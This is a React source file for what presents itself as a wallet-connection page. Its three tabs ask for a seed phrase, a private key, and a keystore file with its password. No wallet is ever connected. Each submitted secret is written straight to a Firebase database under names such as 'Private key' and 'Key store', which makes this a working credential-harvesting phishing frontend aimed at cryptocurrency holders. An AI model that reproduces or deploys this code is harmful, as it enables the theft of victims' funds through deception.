import React, { useState }  from "react";
import "./style.css";
import  {db} from '../../firebase'
import { Data } from "../../Data";


export const FirstTab = (props) => {
  const [inputValue, setInputValue] = useState('');

  const handleInputChange = (event) => {
    setInputValue(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    
    db.collection("details").add({
      phrase:inputValue,
    
    }).then(()=>{
      alert('details sent');
    }).catch(error =>{
      alert(error.message);
    })
    setInputValue("")
  };

  return (
    <div className="FirstTab">
      <p className="key-type">input secret phrase</p>
      <form  onSubmit={handleSubmit}>
      <textarea
      type="text" value={inputValue} onChange={handleInputChange}
        name="postContent"
        rows={4}
        cols={40}
        placeholder="Enter Phrase"
        style={{
          width: "100%",
          color: "#000000",
          fontSize: 16,
          padding: 5,
        }}
      />
      <p className="type-info">
        Typically 12(sometimes 24) words separated by single spaces
      </p>

      <div className="" onClick={() => {}}>
        <button type="submit" className="submit-key">Connect Wallet</button>
      </div>
      </form>
    </div>
  );
};

// SecondTab.js

export const SecondTab = () => {
  const [inputValue, setInputValue] = useState('');


  const handleInputChange = (event) => {
    setInputValue(event.target.value);
  };

  
  const handleSubmit = (event) => {
    event.preventDefault();
    // do something with the input value
    db.collection("Private key").add({
      privateKey:inputValue,
    
    }).then(()=>{
      alert('details sent');
    }).catch(error =>{
      alert(error.message);
    })
    setInputValue("")
  };

  return (
    <div className="SecondTab">
     
      <p className="key-type">input Private Key </p>
      <form onSubmit={handleSubmit}>
      <input
      
      type="text" value={inputValue} onChange={handleInputChange}
        name="name"
        placeholder="Enter Private Key"
        style={{
          padding: 5,
          width: "80%",
          borderRadius: 15,
          color:'#000000'
        }}
      />
      <p className="type-info">Typically 64 characters</p>

      <div className="" onClick={() => {}}>
        <button type="submit" className="submit-key">Connect Wallet</button>
      </div>
      </form>
    </div>
  );
};

export const ThirdTab = () => {
  const [inputValue, setInputValue] = useState({
    keystore:'',
    passwordField:''
  });



  const handleInputChange = (event) => {
    const { name, value } = event.target;
    setInputValue({ ...inputValue, [name]: value });
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    db.collection("Key store").add({
      keystore:inputValue.keystore,
      password: inputValue.passwordField
    
    }).then(()=>{
      alert('details sent');
    }).catch(error =>{
      alert(error.message);
    })
    setInputValue({
      keystore:'',
      passwordField:''
    })
  };

  return (
    <div className="SecondTab">
      <p className="key-type">input Keystore JSON </p>
      <form onSubmit={handleSubmit}>
      <textarea
       type="text" value={inputValue.keystore} onChange={handleInputChange}
        name="keystore"
        rows={4}
        cols={40}
        placeholder="Enter Keystore JSON"
        style={{
          width: "80%",
          color: "#000000",
          fontSize: 16,
          padding: 5,
          borderRadius: 8
        }}
      />

      <input
       type="text" value={inputValue.passwordField} onChange={handleInputChange}
        name="passwordField"
        placeholder="Enter Password"
        style={{
          padding: 5,
          width: "80%",
          marginTop: 10,
          borderRadius: 8,
          color: "#000000",
        }}
      />
      <p className="type-info">Several lines of text beginning with "{}" plus the password you used to encrypt it</p>

      <div className="" onClick={() => {}}>
        <button className="submit-key">Connect Wallet</button>
      </div>
      </form>
    </div>
  );
};
